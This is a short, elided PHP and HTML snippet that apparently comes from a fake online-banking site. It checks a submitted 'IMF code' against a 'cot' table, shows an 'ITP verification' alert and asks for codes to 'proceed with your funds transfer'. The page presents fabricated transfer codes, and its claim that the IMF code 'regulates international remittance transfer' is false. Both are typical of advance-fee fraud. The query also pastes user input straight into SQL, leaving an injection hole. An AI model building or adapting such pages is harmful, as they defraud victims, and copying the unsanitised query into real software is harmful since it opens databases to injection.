...
if(isset($_POST['pro'])){
	...
	$admin_query = "select * from cot where item='$item' AND id=2";
	...
	echo "<script>alert('Your ITP verification is successfull. Press OK to continue')</script>";
...
<div id="div1">
    ...
    <label>Please enter your IMF code to proceed with your funds transfer<br/><strong>IMF</strong> code is International Monetary Fund is the IMF code that regulates international remittance transfer.</label>
    <input type="text" name="item" placeholder="IMF" required>
